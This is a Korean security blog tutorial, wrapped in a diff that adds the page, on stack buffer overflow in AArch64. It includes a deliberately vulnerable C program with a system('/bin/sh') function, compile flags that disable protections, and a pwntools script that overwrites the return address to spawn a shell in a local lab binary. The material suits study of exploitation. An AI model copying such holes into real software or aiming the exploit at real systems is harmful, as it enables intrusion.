@@ -1,0 +1,114 @@
+<!doctype html>
+<html lang="ko" data-theme="light"><head>
+  <meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>[AArch64] Buffer OverFlow · whrds.log</title><meta name="description" content="※ 잘못된 부분이 있으면 알려주세요. 확인 후 수정하도록 하겠습니다. ※ Buffer OverFlow에 대한 개념은 아래 링크에서 확인할 수 있다. https://whrdud727.tistory.com/5 [PWNABLE]Stack Buffer OverFlow ※ 잘못된 부분이 있으면 알려주세요. 확인 후 수정하도록 하겠">
+  <meta name="theme-color" content="#f7f7f3"><link rel="canonical" href="https://whrds.github.io/ko/posts/aarch64-buffer-overflow/">
+  <link rel="alternate" hreflang="ko" href="https://whrds.github.io/ko/posts/aarch64-buffer-overflow/"><link rel="alternate" hreflang="en" href="https://whrds.github.io/en/posts/aarch64-buffer-overflow/">
+  <meta property="og:type" content="article"><meta property="og:title" content="[AArch64] Buffer OverFlow · whrds.log"><meta property="og:description" content="※ 잘못된 부분이 있으면 알려주세요. 확인 후 수정하도록 하겠습니다. ※ Buffer OverFlow에 대한 개념은 아래 링크에서 확인할 수 있다. https://whrdud727.tistory.com/5 [PWNABLE]Stack Buffer OverFlow ※ 잘못된 부분이 있으면 알려주세요. 확인 후 수정하도록 하겠"><meta property="og:url" content="https://whrds.github.io/ko/posts/aarch64-buffer-overflow/">
+  <link rel="icon" href="/assets/favicon.svg" type="image/svg+xml"><link rel="stylesheet" href="/assets/styles.css">
+  <script>try{const t=localStorage.getItem('theme');if(t)document.documentElement.dataset.theme=t;else if(matchMedia('(prefers-color-scheme:dark)').matches)document.documentElement.dataset.theme='dark'}catch(e){}</script>
+  <script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","headline":"[AArch64] Buffer OverFlow","description":"※ 잘못된 부분이 있으면 알려주세요. 확인 후 수정하도록 하겠습니다. ※ Buffer OverFlow에 대한 개념은 아래 링크에서 확인할 수 있다. https://whrdud727.tistory.com/5 [PWNABLE]Stack Buffer OverFlow ※ 잘못된 부분이 있으면 알려주세요. 확인 후 수정하도록 하겠","datePublished":"2024-03-20","inLanguage":"ko","url":"https://whrds.github.io/ko/posts/aarch64-buffer-overflow/","author":{"@type":"Person","name":"whrds"}}</script>
+</head><body>
+  <a class="skip-link" href="#main">본문으로 건너뛰기</a>
+  <header class="site-header"><div class="shell header-inner">
+    <a class="brand" href="/ko/" aria-label="whrds.log home"><span class="brand-mark">W_</span><span class="brand-text">whrds.log</span></a>
+    <nav class="main-nav" aria-label="주 메뉴">
+      <a href="/ko/" aria-current="page">글</a>
+      <a href="/ko/about/">소개</a>
+    </nav>
+    <div class="header-tools">
+      <div class="language-switch" aria-label="Language">
+        <a href="#" class="active" lang="ko" aria-current="true">KO</a>
+        <a href="/en/posts/aarch64-buffer-overflow/" class="" lang="en">EN</a>
+      </div>
+      <button class="icon-button" type="button" data-theme-toggle aria-label="Use dark theme">◐</button>
+    </div>
+  </div></header>
+  <main id="main"><article class="article-wrap"><header class="article-header"><p class="eyebrow">Security research notes</p><h1>[AArch64] Buffer OverFlow</h1><p class="article-description">※ 잘못된 부분이 있으면 알려주세요. 확인 후 수정하도록 하겠습니다. ※ Buffer OverFlow에 대한 개념은 아래 링크에서 확인할 수 있다. https://whrdud727.tistory.com/5 [PWNABLE]Stack Buffer OverFlow ※ 잘못된 부분이 있으면 알려주세요. 확인 후 수정하도록 하겠</p><div class="article-meta"><time datetime="2024-03-20">2024년 3월 20일</time><span>·</span><span>1 분 읽기</span></div></header><div class="prose"><p><strong>※ 잘못된 부분이 있으면 알려주세요. 확인 후 수정하도록 하겠습니다. <strong>※</strong></strong> </p>
+<p>Buffer OverFlow에 대한 개념은 아래 링크에서 확인할 수 있다.</p>
+<p><a href="https://whrdud727.tistory.com/5">https://whrdud727.tistory.com/5</a></p>
+<p> [[PWNABLE]Stack Buffer OverFlow</p>
+<p>※ 잘못된 부분이 있으면 알려주세요. 확인 후 수정하도록 하겠습니다. ※ Buffer OverFlow는 발생하는 영역에 따라서 Stack Buffer OverFlow와 Heap Buffer OverFlow로 나뉜다. Heap에 대해서는 다음에 다룰 예정</p>
+<p><a href="http://whrdud727.tistory.com">whrdud727.tistory.com</a>](<a href="https://whrdud727.tistory.com/5">https://whrdud727.tistory.com/5</a>)</p>
+<p><a href="https://whrdud727.tistory.com/6">https://whrdud727.tistory.com/6</a></p>
+<p> [[PWNABLE]Return Address Overwrite</p>
+<p>※ 잘못된 부분이 있으면 알려주세요. 확인 후 수정하도록 하겠습니다. ※ 저번 게시글에서 Buffer OverFlow에 대해 간략하게 다뤘다. 이번에는 Stack을 변조하는 것인 Stack Frame에 위치하는 ret 부분을</p>
+<p><a href="http://whrdud727.tistory.com">whrdud727.tistory.com</a>](<a href="https://whrdud727.tistory.com/6">https://whrdud727.tistory.com/6</a>)</p>
+<p>공격 원리는 동일하지만 기존 x86_64와는 stack 구조에 있어서 차이가 있기 때문에 주의해야 한다.</p>
+<p><img src="/assets/images/tistory/tistory-8a8955e8774c/001.png" alt=""></p>
+<p>왼쪽이 x86_64, 오른쪽이 AArch64이다. ret의 주소가 stack의 마지막이 아니라 최상단에 존재한다.</p>
+<p>이를 다시 해석하면 main()만 존재하며 그 안에 BOF 취약점이 발생하는 경우 공격할 수가 없다는 뜻이 된다.</p>
+<hr>
+<pre><code>#include &lt;stdio.h&gt;
+#include &lt;unistd.h&gt;
+
+void initial(){
+	setvbuf(stdin, 0, 2, 0);
+	setvbuf(stdout, 0, 2, 0);
+	setvbuf(stderr, 0, 2, 0);
+}
+
+void shell(){
+	system(&quot;/bin/sh&quot;);
+}
+
+void vuln(){
+	char buf[32];
+	printf(&quot;Exploit\n&quot;);
+	read(0, buf, 0x100);
+	printf(&quot;%s\n&quot;, buf);
+}
+
+int main(){
+	char test[0x20];
+	initial();
+	vuln();;
+
+	return 0;
+}
+</code></pre>
+<p>system(‘/bin/sh’);를 gift로 제공해주는 c언어 코드이다.</p>
+<p>vuln()을 살펴보면 buf변수에 입력할 때 BOF 취약점이 발생하는 것을 볼 수 있다.</p>
+<pre><code>aarch64-linux-gnu-gcc -no-pie -fno-stack-protector bof.c
+</code></pre>
+<p>위와 같은 방법으로 컴파일을 해준다.</p>
+<p>아래 링크에서 사용했던 방식으로 디버깅을 수행한다.</p>
+<p><a href="https://whrdud727.tistory.com/34">https://whrdud727.tistory.com/34</a></p>
+<p> [[AArch64] x86_64 간단 비교</p>
+<p>※ 잘못된 부분이 있으면 알려주세요. 확인 후 수정하도록 하겠습니다. ※ 효율적인 전력 사용과 높은 성능의 위해서 설계된 architecture이다. 주로 스마트폰, 임베디드 시스템 등의 환경에서 사용</p>
+<p><a href="http://whrdud727.tistory.com">whrdud727.tistory.com</a>](<a href="https://whrdud727.tistory.com/34">https://whrdud727.tistory.com/34</a>)</p>
+<p><img src="/assets/images/tistory/tistory-8a8955e8774c/002.png" alt=""></p>
+<p>’</p>
+<p>vuln()을 살펴보면 sp에 -32를 연산하고, read()에서 변수에 sp로부터 24만큼 떨어진 위치에 값을 입력한다.</p>
+<p>다시 말해서 stack 크기 32 중에 24만을 이용하고 있다.</p>
+<p>나머지 8은 sfp에 해당한다.</p>
+<p>이를 간단하게 표현하면 아래와 같다.</p>
+<pre><code>vuln()
+[ret_sp-32] - [stack_sp-24] - [bp]
+main()
+[ret] - [stack_sp] - [bp]
+</code></pre>
+<p>buf의 크기를 확인했으니 이제 값을 입력해보겠다.</p>
+<p><img src="/assets/images/tistory/tistory-8a8955e8774c/003.png" alt=""></p>
+<p>vuln()의 공간을 시작으로 main()의 ret까지 덮어씌어졌다.</p>
+<p><img src="/assets/images/tistory/tistory-8a8955e8774c/004.png" alt=""></p>
+<p>x30이 ret 주소가 들어있는 부분이다.</p>
+<p>바로 페이로드를 작성해주겠다.</p>
+<pre><code>from pwn import *
+
+context.log_level = 'debug'
+p = process(['qemu-aarch64-static','a.out'])
+e = ELF('a.out')
+shell = e.sym['shell']#0x00000000004007ac
+
+payload = b'A'*0x28
+payload += p64(shell)
+p.send(payload)
+
+p.interactive()
+</code></pre>
+<p><img src="/assets/images/tistory/tistory-8a8955e8774c/005.png" alt=""></p>
+</div><div class="article-end"><a href="/ko/">← 모든 글 보기</a><a href="/en/posts/aarch64-buffer-overflow/" hreflang="en">이 글을 영어로 읽기 →</a></div></article></main>
+  <footer class="site-footer"><div class="shell footer-inner"><span>© 2026 whrds</span><span>관찰하고, 검증하고, 기록합니다.</span><a href="/ko/feed.xml">RSS</a></div></footer>
+  <script src="/assets/app.js" defer></script>
+</body></html>
